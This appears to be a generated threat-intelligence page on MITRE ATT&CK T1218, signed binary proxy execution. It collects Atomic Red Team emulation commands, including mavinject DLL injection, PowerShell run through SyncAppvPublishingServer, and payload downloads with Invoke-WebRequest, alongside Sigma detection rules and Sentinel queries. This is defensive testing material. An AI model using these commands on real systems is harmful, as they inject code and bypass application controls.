
# Signed Binary Proxy Execution

## Description

### MITRE Description

> Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.

## Aliases

```

```

## Additional Attributes

* Bypass: ['Anti-virus', 'Application control', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218

## Potential Commands

```
mavinject.exe 1000 /INJECTRUNNING #{dll_payload}

mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\T1218\src\x64\T1218.dll

SyncAppvPublishingServer.exe "n; Start-Process calc.exe"

C:\Windows\SysWow64\Register-CimProvider.exe -Path PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll

InfDefaultInstall.exe PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf

C:\Program Files\Microsoft Office\Office16\protocolhandler.exe "ms-word:nft|u|#{remote_url}"

#{microsoft_wordpath}\protocolhandler.exe "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"

mavinject.exe|SyncAppvPublishingServer.exe
```

## Commands Dataset

```
[{'command': 'mavinject.exe 1000 /INJECTRUNNING #{dll_payload}\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'mavinject.exe #{process_id} /INJECTRUNNING '
             'PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'SyncAppvPublishingServer.exe "n; Start-Process calc.exe"\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path '
             'PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'InfDefaultInstall.exe '
             'PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'C:\\Program Files\\Microsoft '
             'Office\\Office16\\protocolhandler.exe '
             '"ms-word:nft|u|#{remote_url}"\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': '#{microsoft_wordpath}\\protocolhandler.exe '
             '"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"\n',
  'name': None,
  'source': 'atomics/T1218/T1218.yaml'},
 {'command': 'mavinject.exe|SyncAppvPublishingServer.exe',
  'name': None,
  'source': 'SysmonHunter - Signed Binary Proxy Execution'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2018/12/12',
                  'description': 'Detects process injection using the signed '
                                 'Windows tool Mavinject32.exe',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '* /INJECTRUNNING '
                                                             '*'}},
                  'falsepositives': ['unknown'],
                  'id': '17eb8e57-9983-420d-ad8a-2c4976c22eb8',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://twitter.com/gN3mes1s/status/941315826107510784',
                                 'https://reaqta.com/2017/12/mavinject-microsoft-injector/',
                                 'https://twitter.com/Hexacorn/status/776122138063409152'],
                  'status': 'experimental',
                  'tags': ['attack.t1055', 'attack.t1218'],
                  'title': 'MavInject Process Injection'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community',
                  'date': '2019/10/26',
                  'description': 'Execute VBscript code that is referenced '
                                 'within the *.bgi file.',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains|all': ['/popup',
                                                                           '/nolicprompt'],
                                              'Image|endswith': '\\bginfo.exe'}},
                  'falsepositives': ['Unknown'],
                  'id': 'aaf46cdc-934e-4284-b329-34aa701e3771',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml',
                                 'https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1218'],
                  'title': 'Application whitelisting bypass via bginfo'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community',
                  'date': '2019/10/26',
                  'description': 'Launch 64-bit shellcode from the '
                                 'x64_calc.wds file using cdb.exe.',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': '-cf',
                                              'Image|endswith': '\\cdb.exe'}},
                  'falsepositives': ['Legitimate use of debugging tools'],
                  'id': 'b5c7395f-e501-4a08-94d4-57fe7a9da9d2',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml',
                                 'http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1218'],
                  'title': 'Possible Application Whitelisting Bypass via '
                           'WinDbg/CDB as a shellcode runner'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community (rule), @_felamos '
                            '(idea)',
                  'date': '2019/10/12',
                  'description': 'The Devtoolslauncher.exe executes other '
                                 'binary',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': 'LaunchForDeploy',
                                              'Image|endswith': '\\devtoolslauncher.exe'}},
                  'falsepositives': ['Legitimate use of devtoolslauncher.exe '
                                     'by legitimate user'],
                  'id': 'cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml',
                                 'https://twitter.com/_felamos/status/1179811992841797632'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1218'],
                  'title': 'Devtoolslauncher.exe executes specified binary'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community',
                  'date': '2019/10/26',
                  'description': 'Execute C# code located in the consoleapp '
                                 'folder',
                  'detection': {'condition': 'selection',
                                'selection': {'Image|endswith': '\\dnx.exe'}},
                  'falsepositives': ['Legitimate use of dnx.exe by legitimate '
                                     'user'],
                  'id': '81ebd28b-9607-4478-bf06-974ed9d53ed7',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml',
                                 'https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1218'],
                  'title': 'Application Whitelisting bypass via dnx.exe'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community',
                  'date': '2019/10/26',
                  'description': 'Detects execution of of Dxcap.exe',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains|all': ['-c',
                                                                           '.exe'],
                                              'Image|endswith': '\\dxcap.exe'}},
                  'falsepositives': ['Legitimate execution of dxcap.exe by '
                                     'legitimate user'],
                  'id': '60f16a96-db70-42eb-8f76-16763e333590',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml',
                                 'https://twitter.com/harr0ey/status/992008180904419328'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1218'],
                  'title': 'Application Whitelisting bypass via dxcap.exe'}},
 {'data_source': {'author': 'Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, '
                            'oscd.community',
                  'date': '2019/10/25',
                  'description': 'Detects defence evasion attempt via '
                                 'odbcconf.exe execution to load DLL',
                  'detection': {'condition': 'selection_1 or selection_2',
                                'selection_1': {'CommandLine|contains': ['-f',
                                                                         'regsvr'],
                                                'Image|endswith': '\\odbcconf.exe'},
                                'selection_2': {'Image|endswith': '\\rundll32.exe',
                                                'ParentImage|endswith': '\\odbcconf.exe'}},
                  'falsepositives': ['Legitimate use of odbcconf.exe by '
                                     'legitimate user'],
                  'id': '65d2be45-8600-4042-b4c0-577a1ff8a60e',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/07',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml',
                                 'https://twitter.com/Hexacorn/status/1187143326673330176'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1218'],
                  'title': 'Possible Application Whitelisting Bypass via dll '
                           'loaded by odbcconf.exe'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community (rule), @harr0ey '
                            '(idea)',
                  'date': '2019/10/12',
                  'description': 'The OpenWith.exe executes other binary',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': '/c',
                                              'Image|endswith': '\\OpenWith.exe'}},
                  'falsepositives': ['Legitimate use of OpenWith.exe by '
                                     'legitimate user'],
                  'id': 'cec8e918-30f7-4e2d-9bfa-a59cc97ae60f',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Openwith.yml',
                                 'https://twitter.com/harr0ey/status/991670870384021504'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1218'],
                  'title': 'OpenWith.exe executes specified binary'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community',
                  'date': '2019/10/12',
                  'description': 'The psr.exe captures desktop screenshots and '
                                 'saves them on the local machine',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': '/start',
                                              'Image|endswith': '\\Psr.exe'}},
                  'falsepositives': ['Unknown'],
                  'id': '2158f96f-43c2-43cb-952a-ab4580f32382',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Psr.yml',
                                 'https://www.sans.org/summit-archives/file/summit-archive-1493861893.pdf'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1218'],
                  'title': 'psr.exe capture screenshots'}},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']}]
```

## Potential Queries

```json
[{'name': 'Signed Binary Proxy Execution Network',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3and (process_path contains '
           '"certutil.exe"or process_command_line contains '
           '"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*"or '
           'process_path contains "*\\\\replace.exe")'},
 {'name': 'Signed Binary Proxy Execution Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"mavinject*\\\\/injectrunning"or process_command_line contains '
           '"mavinject32*\\\\/injectrunning*"or process_command_line contains '
           '"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*"or '
           'process_command_line contains '
           '"*certutil*script\\\\:https\\\\[\\\\:\\\\]\\\\/\\\\/*"or '
           'process_command_line contains '
           '"*msiexec*http\\\\[\\\\:\\\\]\\\\/\\\\/*"or process_command_line '
           'contains "*msiexec*https\\\\[\\\\:\\\\]\\\\/\\\\/*")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution': {'atomic_tests': [{'auto_generated_guid': 'c426dacf-575d-4937-8611-a148a86a5e61',
                                                                             'dependencies': [{'description': 'T1218.dll '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{dll_payload})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{dll_payload}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{dll_payload}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{dll_payload}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Injects '
                                                                                            'arbitrary '
                                                                                            'DLL '
                                                                                            'into '
                                                                                            'running '
                                                                                            'process '
                                                                                            'specified '
                                                                                            'by '
                                                                                            'process '
                                                                                            'ID. '
                                                                                            'Requires '
                                                                                            'Windows '
                                                                                            '10.\n',
                                                                             'executor': {'command': 'mavinject.exe '
                                                                                                     '#{process_id} '
                                                                                                     '/INJECTRUNNING '
                                                                                                     '#{dll_payload}\n',
                                                                                          'elevation_required': True,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll',
                                                                                                                 'description': 'DLL '
                                                                                                                                'to '
                                                                                                                                'inject',
                                                                                                                 'type': 'Path'},
                                                                                                 'process_id': {'default': '1000',
                                                                                                                'description': 'PID '
                                                                                                                               'of '
                                                                                                                               'process '
                                                                                                                               'receiving '
                                                                                                                               'injection',
                                                                                                                'type': 'string'}},
                                                                             'name': 'mavinject '
                                                                                     '- '
                                                                                     'Inject '
                                                                                     'DLL '
                                                                                     'into '
                                                                                     'running '
                                                                                     'process',
                                                                             'supported_platforms': ['windows']},
                                                                            {'auto_generated_guid': 'd590097e-d402-44e2-ad72-2c6aa1ce78b1',
                                                                             'description': 'Executes '
                                                                                            'arbitrary '
                                                                                            'PowerShell '
                                                                                            'code '
                                                                                            'using '
                                                                                            'SyncAppvPublishingServer.exe. '
                                                                                            'Requires '
                                                                                            'Windows '
                                                                                            '10.\n',
                                                                             'executor': {'command': 'SyncAppvPublishingServer.exe '
                                                                                                     '"n; '
                                                                                                     '#{powershell_code}"\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'powershell_code': {'default': 'Start-Process '
                                                                                                                                'calc.exe',
                                                                                                                     'description': 'PowerShell '
                                                                                                                                    'code '
                                                                                                                                    'to '
                                                                                                                                    'execute',
                                                                                                                     'type': 'string'}},
                                                                             'name': 'SyncAppvPublishingServer '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'arbitrary '
                                                                                     'PowerShell '
                                                                                     'code',
                                                                             'supported_platforms': ['windows']},
                                                                            {'auto_generated_guid': 'ad2c17ed-f626-4061-b21e-b9804a6f3655',
                                                                             'dependencies': [{'description': 'T1218-2.dll '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{dll_payload})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{dll_payload}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{dll_payload}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{dll_payload}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Execute '
                                                                                            'arbitrary '
                                                                                            'dll. '
                                                                                            'Requires '
                                                                                            'at '
                                                                                            'least '
                                                                                            'Windows '
                                                                                            '8/2012. '
                                                                                            'Also '
                                                                                            'note '
                                                                                            'this '
                                                                                            'dll '
                                                                                            'can '
                                                                                            'be '
                                                                                            'served '
                                                                                            'up '
                                                                                            'via '
                                                                                            'SMB\n',
                                                                             'executor': {'command': 'C:\\Windows\\SysWow64\\Register-CimProvider.exe '
                                                                                                     '-Path '
                                                                                                     '#{dll_payload}\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll',
                                                                                                                 'description': 'DLL '
                                                                                                                                'to '
                                                                                                                                'execute',
                                                                                                                 'type': 'Path'}},
                                                                             'name': 'Register-CimProvider '
                                                                                     '- '
                                                                                     'Execute '
                                                                                     'evil '
                                                                                     'dll',
                                                                             'supported_platforms': ['windows']},
                                                                            {'auto_generated_guid': '54ad7d5a-a1b5-472c-b6c4-f8090fb2daef',
                                                                             'dependencies': [{'description': 'INF '
                                                                                                              'file '
                                                                                                              'must '
                                                                                                              'exist '
                                                                                                              'on '
                                                                                                              'disk '
                                                                                                              'at '
                                                                                                              'specified '
                                                                                                              'location '
                                                                                                              '(#{inf_to_execute})\n',
                                                                                               'get_prereq_command': 'New-Item '
                                                                                                                     '-Type '
                                                                                                                     'Directory '
                                                                                                                     '(split-path '
                                                                                                                     '#{inf_to_execute}) '
                                                                                                                     '-ErrorAction '
                                                                                                                     'ignore '
                                                                                                                     '| '
                                                                                                                     'Out-Null\n'
                                                                                                                     'Invoke-WebRequest '
                                                                                                                     '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" '
                                                                                                                     '-OutFile '
                                                                                                                     '"#{inf_to_execute}"\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '#{inf_to_execute}) '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Test '
                                                                                            'execution '
                                                                                            'of '
                                                                                            'a '
                                                                                            '.inf '
                                                                                            'using '
                                                                                            'InfDefaultInstall.exe\n'
                                                                                            '\n'
                                                                                            'Reference: '
                                                                                            'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n',
                                                                             'executor': {'command': 'InfDefaultInstall.exe '
                                                                                                     '#{inf_to_execute}\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf',
                                                                                                                    'description': 'Local '
                                                                                                                                   'location '
                                                                                                                                   'of '
                                                                                                                                   'inf '
                                                                                                                                   'file',
                                                                                                                    'type': 'string'}},
                                                                             'name': 'InfDefaultInstall.exe '
                                                                                     '.inf '
                                                                                     'Execution',
                                                                             'supported_platforms': ['windows']},
                                                                            {'auto_generated_guid': 'db020456-125b-4c8b-a4a7-487df8afb5a2',
                                                                             'dependencies': [{'description': 'Microsoft '
                                                                                                              'Word '
                                                                                                              'must '
                                                                                                              'be '
                                                                                                              'installed '
                                                                                                              'with '
                                                                                                              'the '
                                                                                                              'correct '
                                                                                                              'path '
                                                                                                              'and '
                                                                                                              'protocolhandler.exe '
                                                                                                              'must '
                                                                                                              'be '
                                                                                                              'provided\n',
                                                                                               'get_prereq_command': 'write-host '
                                                                                                                     '"Install '
                                                                                                                     'Microsoft '
                                                                                                                     'Word '
                                                                                                                     'or '
                                                                                                                     'provide '
                                                                                                                     'correct '
                                                                                                                     'path."\n',
                                                                                               'prereq_command': 'if '
                                                                                                                 '(Test-Path '
                                                                                                                 '"#{microsoft_wordpath}\\protocolhandler.exe") '
                                                                                                                 '{exit '
                                                                                                                 '0} '
                                                                                                                 'else '
                                                                                                                 '{exit '
                                                                                                                 '1}\n'}],
                                                                             'dependency_executor_name': 'powershell',
                                                                             'description': 'Emulates '
                                                                                            'attack '
                                                                                            'via '
                                                                                            'documents '
                                                                                            'through '
                                                                                            'protocol '
                                                                                            'handler '
                                                                                            'in '
                                                                                            'Microsoft '
                                                                                            'Office.  '
                                                                                            'On '
                                                                                            'successful '
                                                                                            'execution '
                                                                                            'you '
                                                                                            'should '
                                                                                            'see '
                                                                                            'Microsoft '
                                                                                            'Word '
                                                                                            'launch '
                                                                                            'a '
                                                                                            'blank '
                                                                                            'file.\n',
                                                                             'executor': {'command': '#{microsoft_wordpath}\\protocolhandler.exe '
                                                                                                     '"ms-word:nft|u|#{remote_url}"\n',
                                                                                          'elevation_required': False,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'microsoft_wordpath': {'default': 'C:\\Program '
                                                                                                                                   'Files\\Microsoft '
                                                                                                                                   'Office\\Office16',
                                                                                                                        'description': 'path '
                                                                                                                                       'to '
                                                                                                                                       'office '
                                                                                                                                       'folder',
                                                                                                                        'type': 'path'},
                                                                                                 'remote_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx',
                                                                                                                'description': 'url '
                                                                                                                               'to '
                                                                                                                               'document',
                                                                                                                'type': 'url'}},
                                                                             'name': 'ProtocolHandler.exe '
                                                                                     'Downloaded '
                                                                                     'a '
                                                                                     'Suspicious '
                                                                                     'File',
                                                                             'supported_platforms': ['windows']}],
                                                           'attack_technique': 'T1218',
                                                           'display_name': 'Signed '
                                                                           'Binary '
                                                                           'Proxy '
                                                                           'Execution'}},
 {'SysmonHunter - T1218': {'description': None,
                           'level': 'medium',
                           'name': 'Signed Binary Proxy Execution',
                           'phase': 'Execution',
                           'query': [{'process': {'any': {'pattern': 'mavinject.exe|SyncAppvPublishingServer.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Exploit Protection](../mitigations/Exploit-Protection.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Execution Prevention](../mitigations/Execution-Prevention.md)
    
* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    

# Actors

None
